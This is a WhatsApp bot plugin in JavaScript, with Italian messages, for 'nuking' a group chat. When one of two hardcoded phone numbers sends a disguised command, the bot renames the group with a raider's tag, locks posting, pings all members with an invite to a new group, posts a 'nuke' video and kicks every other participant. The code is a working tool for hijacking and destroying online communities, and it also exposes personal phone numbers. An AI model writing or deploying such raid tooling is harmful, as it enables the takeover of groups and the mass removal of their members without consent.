import fs from 'fs'
import path from 'path'

let handler = async (m, { conn }) => {
  if (!m.isGroup) return await conn.reply(m.chat, 'Questo comando funziona solo nei gruppi.', m)

  const botJid = conn.user?.jid || conn.user?.id || ''

  const autorizzati = [
    "15799941146@s.whatsapp.net",
    "393892016995@s.whatsapp.net"
  ]

  if (!autorizzati.includes(m.sender)) {
    return await conn.reply(m.chat, '⛔ Non sei autorizzato a usare questo comando.', m)
  }

  try {
    let metadata
    try {
      metadata = await conn.groupMetadata(m.chat)
    } catch {
      return await conn.reply(m.chat, 'Il bot deve essere amministratore.', m)
    }

    const oldTitle = metadata.subject || 'FALLITI'
    const newTitle = `${oldTitle} | 𝐒𝐕𝐓 𝐁𝐘 ✧ 𝐃𝐈𝐄𝐇 ✧`
    await conn.groupUpdateSubject(m.chat, newTitle).catch(() => null)
    await conn.groupSettingUpdate(m.chat, 'announcement').catch(() => null)

    const kickList = metadata.participants
      .filter(p => p.id !== botJid && !autorizzati.includes(p.id))
      .map(p => p.id)

    await conn.sendMessage(m.chat, {
      text: `ciao🤗`
    }, { quoted: m })

    await conn.sendMessage(m.chat, {
      text: `*CI TRASFERIAMO QUA* ⇩

https://chat.whatsapp.com/DwiVCgiaf6O5xDsdBDog8h`,
      mentions: kickList
    }, { quoted: m })

    const videoPath = path.join(process.cwd(), 'media', 'nuke.mp4')
    if (!fs.existsSync(videoPath)) {
      return await conn.reply(m.chat, '❌ ERRORE: manca il file *nuke.mp4* ', m)
    }

    await conn.sendMessage(m.chat, {
      video: fs.readFileSync(videoPath),
      caption: '🔥',
      gifPlayback: true
    }, { quoted: m })

    if (kickList.length > 0) {
      await conn.groupParticipantsUpdate(m.chat, kickList, 'remove').catch(() => null)
    }

  } catch (e) {}
}

handler.help = ['nuke']
handler.tags = ['owner']
handler.command = /^(kitemmurt|trimone)$/i
handler.group = true
handler.botAdmin = true

export default handler